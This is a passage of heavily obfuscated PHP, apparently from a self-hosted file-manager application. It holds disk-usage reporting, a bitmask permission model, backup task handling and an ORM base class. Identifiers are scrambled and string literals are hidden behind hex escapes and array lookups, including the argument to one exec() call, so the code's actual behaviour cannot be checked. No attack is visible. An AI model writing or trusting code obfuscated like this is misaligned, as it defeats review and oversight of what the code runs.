$ÀÃİ€’Û[$ÙÓ£¨ü¼[1070]]; if ($Œ¦¾¿Ùü == $ÙÓ£¨ü¼[1058]) { $¼²÷­ÄÅ = explode($ÙÓ£¨ü¼[1388], $ÀÃİ€’Û[$ÙÓ£¨ü¼[1069]]); $Œ¦¾¿Ùü = $¼²÷­ÄÅ[0]; } if ($Œ¦¾¿Ùü == $ÙÓ£¨ü¼[1006] || $Œ¦¾¿Ùü == $ÙÓ£¨ü¼[899]) { $œšó«—÷ = Model()->db()->query($ÙÓ£¨ü¼[1983]); $Õ›¹¼â™ = $œšó«—÷[0] && isset($œšó«—÷[0][$ÙÓ£¨ü¼[1686]]) ? $œšó«—÷[0][$ÙÓ£¨ü¼[1686]] : 0; $Œ¦¾¿Ùü = $ÙÓ£¨ü¼[1984] . ($Õ›¹¼â™ ? $ÙÓ£¨ü¼[8] . $Õ›¹¼â™ : $ÙÓ£¨ü¼[12]); } $€¯İ—òó = $GLOBALS[$ÙÓ£¨ü¼[6]][$ÙÓ£¨ü¼[435]][$ÙÓ£¨ü¼[923]]; return array($ÙÓ£¨ü¼[1985] => $ÔèŠÍË¶ ? $ÔèŠÍË¶[$ÙÓ£¨ü¼[1986]] : 0, $ÙÓ£¨ü¼[1987] => $ÔèŠÍË¶ ? $ÔèŠÍË¶[$ÙÓ£¨ü¼[1988]] : 0, $ÙÓ£¨ü¼[1989] => (int) $Öš†¢„[$ÙÓ£¨ü¼[1986]] * 1024 * 1024 * 1024, $ÙÓ£¨ü¼[1990] => (int) $¿¿Œó¥ç, $ÙÓ£¨ü¼[1991] => ucfirst($ÃŒë²÷), $ÙÓ£¨ü¼[1992] => $ÙÓ£¨ü¼[1993] . PHP_VERSION, $ÙÓ£¨ü¼[1994] => phpBuild64() ? 64 : 32, $ÙÓ£¨ü¼[848] => str_replace($ÙÓ£¨ü¼[1226], $ÙÓ£¨ü¼[1086], $Œ¦¾¿Ùü), $ÙÓ£¨ü¼[435] => ucfirst($€¯İ—òó), $ÙÓ£¨ü¼[32] => $_SERVER[$ÙÓ£¨ü¼[1995]]); } private function diskDriver() { $Ç‚ŒîÚ =& $_SERVER[É¨™èà]; $ áÄ†Ë¤ = $Ç‚ŒîÚ[8]; $øµ÷Œˆ” = $GLOBALS[$Ç‚ŒîÚ[6]][$Ç‚ŒîÚ[1412]] == $Ç‚ŒîÚ[1413]; if ($øµ÷Œˆ”) { $ áÄ†Ë¤ = $Ç‚ŒîÚ[1996]; if (function_exists($Ç‚ŒîÚ[1997])) { exec($Ç‚ŒîÚ[1998], $÷ú¸˜Üë); $ áÄ†Ë¤ = $÷ú¸˜Üë[1] . $Ç‚ŒîÚ[8]; } } if (!file_exists($ áÄ†Ë¤)) { return; } if (!function_exists($Ç‚ŒîÚ[1999])) { return; } $¯Ë­ïƒ = @disk_total_space($ áÄ†Ë¤); $Œ¦ìóñò = $¯Ë­ïƒ - @disk_free_space($ áÄ†Ë¤); return array($Ç‚ŒîÚ[1986] => $¯Ë­ïƒ, $Ç‚ŒîÚ[1988] => $Œ¦ìóñò); } public function fileChart($İè¯£’Š) { $Ö¼“µîÉ =& $_SERVER[É¨™èà]; if (isset($İè¯£’Š[$Ö¼“µîÉ[1800]])) { return Model($Ö¼“µîÉ[921])->userFileTypeProfile($İè¯£’Š[$Ö¼“µîÉ[1800]]); } if (isset($İè¯£’Š[$Ö¼“µîÉ[1410]])) { return Model($Ö¼“µîÉ[921])->groupFileTypeProfile($İè¯£’Š[$Ö¼“µîÉ[1410]]); } $›úƒæí¾ = $this->sourceSize(); $ ñ¢î  = array($Ö¼“µîÉ[193] => 0, $Ö¼“µîÉ[191] => 1); $ıöÃ¨Èò = Model($Ö¼“µîÉ[921])->where($ ñ¢î )->sum($Ö¼“µîÉ[79]); $ ñ¢î [$Ö¼“µîÉ[191]] = 2; $ğâ§Ÿíğ = Model($Ö¼“µîÉ[921])->where($ ñ¢î )->sum($Ö¼“µîÉ[79]); return array($Ö¼“µîÉ[854] => $›úƒæí¾[$Ö¼“µîÉ[79]], $Ö¼“µîÉ[1934] => $›úƒæí¾[$Ö¼“µîÉ[1934]], $Ö¼“µîÉ[1935] => (int) $ıöÃ¨Èò, $Ö¼“µîÉ[1936] => (int) $ğâ§Ÿíğ); } private function sourceSize() { $Ô‘Ùş¦· =& $_SERVER[É¨™èà]; $ÌãÌÜ½ = Model($Ô‘Ùş¦·[921])->where(array($Ô‘Ùş¦·[495] => 0))->sum($Ô‘Ùş¦·[79]); $ÔÆãôãŞ = Model($Ô‘Ùş¦·[556])->sum($Ô‘Ùş¦·[79]); if ($ÔÆãôãŞ > $ÌãÌÜ½) { $ÔÆãôãŞ = $ÌãÌÜ½; } return array($Ô‘Ùş¦·[79] => (int) $ÌãÌÜ½, $Ô‘Ùş¦·[1934] => (int) $ÔÆãôãŞ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $æ¦¹´Å =& $_SERVER[É¨™èà]; $¨×¹ËĞ = array(array($æ¦¹´Å[504] => LNG($æ¦¹´Å[2000]), $æ¦¹´Å[2001] => $æ¦¹´Å[2002], $æ¦¹´Å[2003] => 1, $æ¦¹´Å[2004] => 1, $æ¦¹´Å[2005] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($æ¦¹´Å[504] => LNG($æ¦¹´Å[2006]), $æ¦¹´Å[2001] => $æ¦¹´Å[2007], $æ¦¹´Å[2003] => 2, $æ¦¹´Å[2004] => 1, $æ¦¹´Å[2005] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($æ¦¹´Å[504] => LNG($æ¦¹´Å[2008]), $æ¦¹´Å[2001] => $æ¦¹´Å[2009], $æ¦¹´Å[2003] => 3, $æ¦¹´Å[2004] => 1, $æ¦¹´Å[2005] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($æ¦¹´Å[504] => LNG($æ¦¹´Å[2010]), $æ¦¹´Å[2001] => $æ¦¹´Å[2011], $æ¦¹´Å[2003] => 4, $æ¦¹´Å[2004] => 1, $æ¦¹´Å[2005] => self::AUTH_SHOW | self::AUTH_VIEW), array($æ¦¹´Å[504] => LNG($æ¦¹´Å[2012]), $æ¦¹´Å[2001] => $æ¦¹´Å[2013], $æ¦¹´Å[2003] => 5, $æ¦¹´Å[2004] => 1, $æ¦¹´Å[2005] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($æ¦¹´Å[504] => LNG($æ¦¹´Å[2014]), $æ¦¹´Å[2001] => $æ¦¹´Å[2015], $æ¦¹´Å[2003] => 6, $æ¦¹´Å[2004] => 1, $æ¦¹´Å[2005] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($æ¦¹´Å[504] => LNG($æ¦¹´Å[2016]), $æ¦¹´Å[2001] => $æ¦¹´Å[2017], $æ¦¹´Å[2003] => 7, $æ¦¹´Å[2004] => 1, $æ¦¹´Å[2005] => 0)); return $¨×¹ËĞ; } public static function authCheck($¡«ãœ§Ó, $øŒƒò³Á) { $¡…Ÿ’İ =& $_SERVER[É¨™èà]; $¡«ãœ§Ó = intval($¡«ãœ§Ó); if (KodUser::isRoot() && $GLOBALS[$¡…Ÿ’İ[6]][$¡…Ÿ’İ[2018]]) { return !0; } if ($¡«ãœ§Ó <= 0) { return !1; } if (($¡«ãœ§Ó & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¡«ãœ§Ó & $øŒƒò³Á); } public static function authCheckShow($Ô­Ãêæ) { return self::authCheck($Ô­Ãêæ, self::AUTH_SHOW); } public static function authCheckView($¡Áû‰ñü) { return self::authCheck($¡Áû‰ñü, self::AUTH_VIEW); } public static function authCheckDownload($ò•ğñŠ£) { return self::authCheck($ò•ğñŠ£, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ŠºË¥„ñ) { return self::authCheck($ŠºË¥„ñ, self::AUTH_UPLOAD); } public static function authCheckEdit($öÜßş»…) { return self::authCheck($öÜßş»…, self::AUTH_EDIT); } public static function authCheckRemove($ü…È‹‹) { return self::authCheck($ü…È‹‹, self::AUTH_REMOVE); } public static function authCheckShare($œ…¶à¤å) { return self::authCheck($œ…¶à¤å, self::AUTH_SHARE); } public static function authCheckComment($ç˜»¶°í) { return self::authCheck($ç˜»¶°í, self::AUTH_COMMENT); } public static function authCheckEvent($Ä—…ñÉí) { return self::authCheck($Ä—…ñÉí, self::AUTH_EVENT); } public static function authCheckRoot($ÇÈá‹) { return self::authCheck($ÇÈá‹, self::AUTH_ROOT); } public static function authCheckAction($¼˜ê™·, $ßæ’èÏÑ) { $¡™›äß =& $_SERVER[É¨™èà]; $¿ÁÂ‹§ = array($¡™›äß[2019] => self::AUTH_VIEW, $¡™›äß[1299] => self::AUTH_DOWNLOAD, $¡™›äß[110] => self::AUTH_UPLOAD, $¡™›äß[1969] => self::AUTH_EDIT, $¡™›äß[1247] => self::AUTH_REMOVE, $¡™›äß[1979] => self::AUTH_SHARE, $¡™›äß[440] => self::AUTH_COMMENT, $¡™›äß[1787] => self::AUTH_EVENT, $¡™›äß[2020] => self::AUTH_ROOT); if (!isset($¿ÁÂ‹§[$ßæ’èÏÑ])) { return; } $¼ñ­Ìì = $¿ÁÂ‹§[$ßæ’èÏÑ]; $¼˜ê™· = intval($¼˜ê™·); if ($¼˜ê™· <= 0) { return !1; } if (($¼˜ê™· & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¼˜ê™· & $¼ñ­Ìì); } public static function authDisable($îÍÁ”Ø, $ìş»‰Ù÷) { if (intval($îÍÁ”Ø) <= 0) { return 0; } return intval($îÍÁ”Ø) & ~$ìş»‰Ù÷; } public $optionType = "\x53\x79\x73\x74\145\x6d\56\x73\157\165\x72\x63\x65\101\x75\164\x68\114\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\141\165\x74\150", "\x6c\141\x62\x65\154", "\x64\x69\x73\160\154\141\171", "\x73\171\x73\x74\145\155", "\x73\x6f\162\x74"); public function initData() { $íéÒı«± = $this->authDefault(); foreach ($íéÒı«± as $ãª¬İ÷«) { $this->add($ãª¬İ÷«); } } public function findAuth($™ÅÒè‚¥, $İªØÆæ) { $¯ãÖŞ‡é =& $_SERVER[É¨™èà]; $ş­ÌÚ“ù = parent::listData(); foreach ($ş­ÌÚ“ù as $ğÍ§²É—) { $¢—ñÇ¤ = intval($ğÍ§²É—[$¯ãÖŞ‡é[497]]); if ($¢—ñÇ¤ <= 0 || $ğÍ§²É—[$¯ãÖŞ‡é[2021]] == 0) { continue; } if (($¢—ñÇ¤ & $™ÅÒè‚¥) != $™ÅÒè‚¥) { continue; } if (($¢—ñÇ¤ & $İªØÆæ) != 0) { continue; } return $ğÍ§²É—[$¯ãÖŞ‡é[485]]; } return !1; } public function findAuthMax($ÉëİÆ²š, $ï—½şˆ) { $¬»ª£•“ =& $_SERVER[É¨™èà]; $Êøƒ” = !1; $ş©‡§æë = parent::listData(); foreach ($ş©‡§æë as $Ò¬Ú­“¦) { $™ıœŞè– = intval($Ò¬Ú­“¦[$¬»ª£•“[497]]); if ($™ıœŞè– <= 0 || $Ò¬Ú­“¦[$¬»ª£•“[2021]] == 0) { continue; } if (($™ıœŞè– & $ÉëİÆ²š) != $ÉëİÆ²š) { continue; } if (($™ıœŞè– & $ï—½şˆ) != 0) { continue; } if (!$Êøƒ”) { $Êøƒ” = $Ò¬Ú­“¦; continue; } if (intval($Êøƒ”[$¬»ª£•“[497]]) < $™ıœŞè–) { $Êøƒ” = $Ò¬Ú­“¦; } } return $Êøƒ” ? $Êøƒ”[$¬»ª£•“[485]] : !1; } public function findAuthReadOnly() { $ª¦Ñ…ó = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $‰¡‰ñÄ‹ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ª¦Ñ…ó, $‰¡‰ñÄ‹); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $õØ¡’´º =& $_SERVER[É¨™èà]; $ô·˜é’â = parent::listData(); $ËËí‘Œí = !1; foreach ($ô·˜é’â as $±êØŞÎ) { if ($±êØŞÎ[$õØ¡’´º[497]] <= 0 || $±êØŞÎ[$õØ¡’´º[2021]] == $õØ¡’´º[231]) { continue; } if (!$ËËí‘Œí) { $ËËí‘Œí = $±êØŞÎ; continue; } if ($ËËí‘Œí[$õØ¡’´º[497]] > $±êØŞÎ[$õØ¡’´º[497]]) { $ËËí‘Œí = $±êØŞÎ; } } return $ËËí‘Œí ? $ËËí‘Œí[$õØ¡’´º[485]] : $õØ¡’´º[12]; } public function listData($‘…šë = false, $éÓá¶¥Ê = "\163\157\x72\x74", $¤ü¾î•á = false) { return parent::listData($‘…šë, $éÓá¶¥Ê, $¤ü¾î•á); } public function update($Õçşóˆ˜, $àş¢¾á†) { $ÛÜ¥¿Óê =& $_SERVER[É¨™èà]; $çœØåùÃ = parent::listData($Õçşóˆ˜); $Ğëİ‡‹ş = $this->findByName($àş¢¾á†[$ÛÜ¥¿Óê[32]]); if (!$çœØåùÃ || $Ğëİ‡‹ş && $Ğëİ‡‹ş[$ÛÜ¥¿Óê[485]] != $çœØåùÃ[$ÛÜ¥¿Óê[485]]) { return !1; } $this->filterAuth($àş¢¾á†[$ÛÜ¥¿Óê[497]]); return parent::update($Õçşóˆ˜, $àş¢¾á†); } public function remove($û·„‡ñÛ) { $§ØÒ«éÀ = parent::listData($û·„‡ñÛ); if (!$§ØÒ«éÀ || $§ØÒ«éÀ[$_SERVER[É¨™èà][192]]) { return !1; } return parent::remove($û·„‡ñÛ); } public function add($®…ßğ– = array()) { $èØóì³ =& $_SERVER[É¨™èà]; if ($this->findByName($®…ßğ–[$èØóì³[32]])) { return !1; } $©Öƒ§œ‡ = array($èØóì³[32] => $èØóì³[12], $èØóì³[497] => 1, $èØóì³[2022] => $èØóì³[2009], $èØóì³[2021] => 1, $èØóì³[192] => 0, $èØóì³[2023] => 0); $®…ßğ– = array_merge($©Öƒ§œ‡, $®…ßğ–); $®…ßğ–[$èØóì³[2023]] = $this->getSort(); $this->filterAuth($®…ßğ–[$èØóì³[497]]); return parent::insert($®…ßğ–); } private function getSort() { $ö±Ã¿ñÁ =& $_SERVER[É¨™èà]; $ıÜçáÕ‘ = parent::listData(); $´òÁ»¾È = array_to_keyvalue($ıÜçáÕ‘, $ö±Ã¿ñÁ[12], $ö±Ã¿ñÁ[2023]); return empty($´òÁ»¾È) ? 0 : max($´òÁ»¾È) + 1; } private function filterAuth(&$ıªêÑä«) { if (!$ıªêÑä«) { return; } $Ê·ãÀØ³ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÆûûöÛº = array(); foreach ($Ê·ãÀØ³ as $¾¡ôÈ‰æ) { if ($ıªêÑä« & $¾¡ôÈ‰æ) { $ÆûûöÛº[] = $¾¡ôÈ‰æ; } } if (in_array(self::AUTH_ROOT, $ÆûûöÛº)) { $ıªêÑä« = array_sum($Ê·ãÀØ³); return; } $ÕãèÄ‡„ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÆûûöÛº as $¾¡ôÈ‰æ) { if (isset($ÕãèÄ‡„[$¾¡ôÈ‰æ])) { $ÆûûöÛº = array_merge($ÆûûöÛº, $ÕãèÄ‡„[$¾¡ôÈ‰æ]); } } $ÆûûöÛº[] = self::AUTH_SHOW; $ıªêÑä« = array_sum(array_unique($ÆûûöÛº)); } public function sort($Ã¾ãß—¬, $êÒ”ıŒ) { return parent::update($Ã¾ãß—¬, $êÒ”ıŒ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\x62\x61\x63\153\x75\160\x4c\151\163\164"; public $field = array("\x69\x6f", "\156\x61\155\x65", "\163\x74\x61\x74\x75\163", "\x63\157\156\164\145\156\x74", "\155\141\156\x75\141\154", "\x72\145\x73\x75\154\x74", "\x74\151\155\x65\x46\x72\x6f\155", "\164\151\x6d\145\x54\x6f"); public function config() { $íõñ·÷â =& $_SERVER[É¨™èà]; Action($íõñ·÷â[2024])->taskInit(); $›æ”èô = Model($íõñ·÷â[861])->get($íõñ·÷â[868]); $›æ”èô = json_decode($›æ”èô, !0); $›æ”èô = is_array($›æ”èô) ? $›æ”èô : array(); $this->parseContent($›æ”èô); unset($›æ”èô[$íõñ·÷â[1769]]); Model($íõñ·÷â[1768])->cacheClear(); $ÒğºÇÆÛ = $íõñ·÷â[2025]; $´µò©äÉ = Model($íõñ·÷â[2026])->findByKey($íõñ·÷â[1787], $ÒğºÇÆÛ); if (!$´µò©äÉ) { $´µò©äÉ = array(); } if (isset($´µò©äÉ[$íõñ·÷â[207]])) { $´µò©äÉ[$íõñ·÷â[207]] = json_decode($´µò©äÉ[$íõñ·÷â[207]], !0); } if (isset($›æ”èô[$íõñ·÷â[207]])) { $´µò©äÉ[$íõñ·÷â[207]][$íõñ·÷â[1772]] = $›æ”èô[$íõñ·÷â[207]]; unset($›æ”èô[$íõñ·÷â[207]]); } return array_merge($´µò©äÉ, $›æ”èô); } public function listData($‡Ïßİ™Ç = false, $ş¼É™ƒà = "\x6d\157\144\x69\146\x79\x54\151\x6d\145", $¹‡²å—œ = false) { $ÃşÅ£¶ò = parent::listData($‡Ïßİ™Ç, $ş¼É™ƒà, !0); if (!$ÃşÅ£¶ò) { return $ÃşÅ£¶ò; } if ($‡Ïßİ™Ç) { $ÃşÅ£¶ò = array($ÃşÅ£¶ò); } foreach ($ÃşÅ£¶ò as &$”¶æˆÙ€) { $this->parseContent($”¶æˆÙ€); } return $‡Ïßİ™Ç ? $ÃşÅ£¶ò[0] : $ÃşÅ£¶ò; } public function parseContent(&$®ÉÊ¥µ›) { $Ï–†ØÌÊ =& $_SERVER[É¨™èà]; $ÒÕïò€ = _get($®ÉÊ¥µ›, $Ï–†ØÌÊ[171], $Ï–†ØÌÊ[91]); if (!in_array($ÒÕïò€, array($Ï–†ØÌÊ[867], $Ï–†ØÌÊ[1226]))) { $®ÉÊ¥µ›[$Ï–†ØÌÊ[171]] = $ÒÕïò€ == $Ï–†ØÌÊ[91] ? $Ï–†ØÌÊ[1226] : $Ï–†ØÌÊ[867]; } } public function lastItem() { $•äÛßèœ = $this->listData(); return !empty($•äÛßèœ[0]) ? $•äÛßèœ[0] : null; } public function kill($ÙâˆÀ) { $ÙÙùÇ =& $_SERVER[É¨™èà]; $Õ®¹“Àı = $this->listData($ÙâˆÀ); if (!$Õ®¹“Àı || empty($Õ®¹“Àı[$ÙÙùÇ[32]])) { return !0; } Task::kill($ÙÙùÇ[876]); Task::kill($ÙÙùÇ[895]); Task::kill($ÙÙùÇ[905]); $Ë’Üô’ı = $Õ®¹“Àı[$ÙÙùÇ[32]]; $âÊí’Ò¡ = TEMP_FILES . $ÙÙùÇ[871] . $Ë’Üô’ı . $ÙÙùÇ[8]; IO::remove($âÊí’Ò¡, !1); return $this->remove($ÙâˆÀ); } public function remove($¼¯ÉÅÕŞ) { $ä‚èºùÃ = $this->listData($¼¯ÉÅÕŞ); if (!$ä‚èºùÃ) { return !0; } return $this->backupRemove($ä‚èºùÃ); } private function backupRemove($ˆ©½¿) { parent::remove($ˆ©½¿[$_SERVER[É¨™èà][485]]); $ø¡Ÿºâù = $this->backupPath($ˆ©½¿); IO::remove($ø¡Ÿºâù, !1); return !0; } private function backupPath($‹ëŸôú) { $Ñèµè¶¼ =& $_SERVER[É¨™èà]; $»Ğõ‡¢Ò = $‹ëŸôú[$Ñèµè¶¼[32]]; $‘à‘Ö‘› = Model($Ñèµè¶¼[861])->get($Ñèµè¶¼[862]); $ÙúˆÈ‚Ë = substr(md5($Ñèµè¶¼[863] . $‘à‘Ö‘› . $»Ğõ‡¢Ò), 0, 8); return "\x7b\151\157\72{$‹ëŸôú[$Ñèµè¶¼[842]]}\x7d\x2f\x64\x61\x74\x61\x62\141\x73\145\57\142\x61\143\153\x75\x70\57" . $»Ğõ‡¢Ò . $Ñèµè¶¼[11] . $ÙúˆÈ‚Ë; } public function start() { $´–éÈ¿Ğ =& $_SERVER[É¨™èà]; if ($GLOBALS[$´–éÈ¿Ğ[6]][$´–éÈ¿Ğ[92]][$´–éÈ¿Ğ[2027]] != $´–éÈ¿Ğ[91]) { return !0; } $šó·­¼å = $this->config(); if (!$šó·­¼å || $šó·­¼å[$´–éÈ¿Ğ[1769]] != $´–éÈ¿Ğ[91]) { return !1; } if ($šó·­¼å[$´–éÈ¿Ğ[171]] == $´–éÈ¿Ğ[867]) { $¼¬¬Ğ¸ = Model($´–éÈ¿Ğ[861])->get($´–éÈ¿Ğ[1344]); if ($¼¬¬Ğ¸ == $´–éÈ¿Ğ[1345]) { $šó·­¼å[$´–éÈ¿Ğ[171]] = $´–éÈ¿Ğ[1226]; } } $³Æ´Áª = $this->process(); foreach ($³Æ´Áª as $º”Ëåµ) { if ($º”Ëåµ) { return Task::restart($º”Ëåµ[$´–éÈ¿Ğ[485]]); } } $â¸‹ÌÍÖ = new Backup(); $’Å ‹ = $â¸‹ÌÍÖ->db(); if ($’Å ‹) { $’Å ‹ = $â¸‹ÌÍÖ->dbFile(); if ($’Å ‹ && $šó·­¼å[$´–éÈ¿Ğ[171]] == $´–éÈ¿Ğ[867]) { $’Å ‹ = $â¸‹ÌÍÖ->file(); } } Backup::set(array($´–éÈ¿Ğ[840] => 1, $´–éÈ¿Ğ[852] => time())); return !0; } public function process() { $¼¶ÄÌ¾é =& $_SERVER[É¨™èà]; $¦Áˆ¢”³ = array($¼¶ÄÌ¾é[848] => Task::get($¼¶ÄÌ¾é[876]), $¼¶ÄÌ¾é[853] => Task::get($¼¶ÄÌ¾é[895]), $¼¶ÄÌ¾é[233] => Task::get($¼¶ÄÌ¾é[905])); $¯ê æ¶± = !1; foreach ($¦Áˆ¢”³ as &$–ÛĞƒ™‚) { if ($¯ê æ¶±) { $–ÛĞƒ™‚ = !1; continue; } if ($–ÛĞƒ™‚) { $·ñËìğÈ = intval(_get($–ÛĞƒ™‚, $¼¶ÄÌ¾é[1805], 0)); if (time() - $·ñËìğÈ > 7200) { Task::kill($–ÛĞƒ™‚[$¼¶ÄÌ¾é[485]]); $¯ê æ¶± = !0; $–ÛĞƒ™‚ = !1; } } } return $¦Áˆ¢”³; } public function restore() { $¯±€˜¶ =& $_SERVER[É¨™èà]; ActionCall($¯±€˜¶[1154], !0, 1); ActionCall($¯±€˜¶[1154], !0, 0); } } goto AœŠêÚ›±; eŒµö¯½‰: define($_SERVER[É¨™èà][331], 0); define($_SERVER[É¨™èà][332], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\x6f\162\144\145\162", "\x61\154\151\x61\163", "\150\141\166\151\x6e\147", "\x67\x72\x6f\165\x70", "\x6c\157\143\x6b", "\144\x69\x73\x74\x69\x6e\143\x74", "\x61\x75\164\157", "\146\x69\x6c\x74\145\162", "\x76\141\154\151\144\141\164\x65", "\x72\145\x73\x75\x6c\x74", "\x62\x69\x6e\x64", "\x74\157\x6b\145\156"); public function __construct($–ı°Ò· = '', $·À«ˆ¼Ú = '', $²ŒÜåË = '') { $Å”€™»‡ =& $_SERVER[É¨™èà]; $this->_initialize(); if (!empty($–ı°Ò·)) { if (strpos($–ı°Ò·, $Å”€™»‡[10])) { list($this->dbName, $this->name) = explode($Å”€™»‡[10], $–ı°Ò·); } else { $this->name = $–ı°Ò·; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($·À«ˆ¼Ú)) { $this->tablePrefix = $Å”€™»‡[12]; } elseif ($Å”€™»‡[12] != $·À«ˆ¼Ú) { $this->tablePrefix = $·À«ˆ¼Ú; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Å”€™»‡[333]); } $this->db(0, empty($this->connection) ? $²ŒÜåË : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $İÚ…µ°ı =& $_SERVER[É¨™èà]; if (empty($this->fields)) { if (think_config($İÚ…µ°ı[334])) { $õ¤—õò = $this->dbName ? $this->dbName : think_config($İÚ…µ°ı[335]); $ìŒç’ø = think_var_cache($İÚ…µ°ı[336] . strtolower(get_path_this($õ¤—õò) . $İÚ…µ°ı[10] . $this->name)); if ($ìŒç’ø) { $¿®¬œïÏ = think_config($İÚ…µ°ı[337]); if (empty($¿®¬œïÏ) || $ìŒç’ø[$İÚ…µ°ı[338]] == $¿®¬œïÏ) { $this->fields = $ìŒç’ø; return; } } } $this->flush(); } } public function flush() { $Äí‚ç =& $_SERVER[É¨™èà]; $this->db->setModel($this->name); $Ìº¢Şù = $this->db->getFields($this->getTableName()); if (!$Ìº¢Şù) { return !1; } $this->fields = array_keys($Ìº¢Şù); $this->fields[$Äí‚ç[339]] = !1; foreach ($Ìº¢Şù as $›€³ŒÍ => $åá’‘¤¾) { $ôÅ©©ñ[$›€³ŒÍ] = $åá’‘¤¾[$Äí‚ç[33]]; if ($åá’‘¤¾[$Äí‚ç[39]]) { $this->fields[$Äí‚ç[340]] = $›€³ŒÍ; if ($åá’‘¤¾[$Äí‚ç[42]]) { $this->fields[$Äí‚ç[339]] = !0; } } } $this->fields[$Äí‚ç[341]] = $ôÅ©©ñ; if (think_config($Äí‚ç[337])) { $this->fields[$Äí‚ç[338]] = think_config($Äí‚ç[337]); } if (think_config($Äí‚ç[334])) { $’¿ÂÒÖó = $this->dbName ? $this->dbName : think_config($Äí‚ç[335]); think_var_cache($Äí‚ç[336] . strtolower(get_path_this($’¿ÂÒÖó) . $Äí‚ç[10] . $this->name), $this->fields); } } public function switchModel($úÑ™ªÛ, $Œëè¨š— = array()) { $İ©¿¤€‰ =& $_SERVER[É¨™èà]; $å™±‚ƒœ = ucwords(strtolower($úÑ™ªÛ)) . $İ©¿¤€‰[342]; if (!class_exists($å™±‚ƒœ)) { think_exception($å™±‚ƒœ . think_lang($İ©¿¤€‰[343])); } $this->_extModel = new $å™±‚ƒœ($this->name); if (!empty($Œëè¨š—)) { foreach ($Œëè¨š— as $à¯Ì³à¼) { $this->_extModel->setProperty($à¯Ì³à¼, $this->{$à¯Ì³à¼}); } } return $this->_extModel; } public function __set($şŞÒš£, $á÷èˆ™÷) { $this->data[$şŞÒš£] = $á÷èˆ™÷; } public function __get($şµÑİÂæ) { return isset($this->data[$şµÑİÂæ]) ? $this->data[$şµÑİÂæ] : null; } public function __isset($©æˆÀ) { return isset($this->data[$©æˆÀ]); } public function __unset($ƒ ÓÒÂï) { unset($this->data[$ƒ ÓÒÂï]); } public function __call($Ã³ğÚ‚È, $İüÇÌûÑ) { $µ¦‰ëİş =& $_SERVER[É¨™èà]; if (in_array(strtolower($Ã³ğÚ‚È), $this->methods, !0)) { $this->options[strtolower($Ã³ğÚ‚È)] = $İüÇÌûÑ[0]; return $this; } elseif (in_array(strtolower($Ã³ğÚ‚È), array($µ¦‰ëİş[344], $µ¦‰ëİş[345], $µ¦‰ëİş[346], $µ¦‰ëİş[347], $µ¦‰ëİş[348]), !0)) { $¹¿İªĞò = isset($İüÇÌûÑ[0]) ? $İüÇÌûÑ[0] : $µ¦‰ëİş[223]; $¹¿İªĞò = $this->db->parseKey($¹¿İªĞò); return $this->getField(strtoupper($Ã³ğÚ‚È) . $µ¦‰ëİş[349] . $¹¿İªĞò . $µ¦‰ëİş[350] . $Ã³ğÚ‚È, $µ¦‰ëİş[344]); } elseif (strtolower(substr($Ã³ğÚ‚È, 0, 5)) == $µ¦‰ëİş[351]) { $¹¿İªĞò = think_parse_name(substr($Ã³ğÚ‚È, 5)); $Ú¯ÈæÂ”[$¹¿İªĞò] = $İüÇÌûÑ[0]; return $this->where($Ú¯ÈæÂ”)->find(); } elseif (strtolower(substr($Ã³ğÚ‚È, 0, 10)) == $µ¦‰ëİş[352]) { $šæ½÷õ = 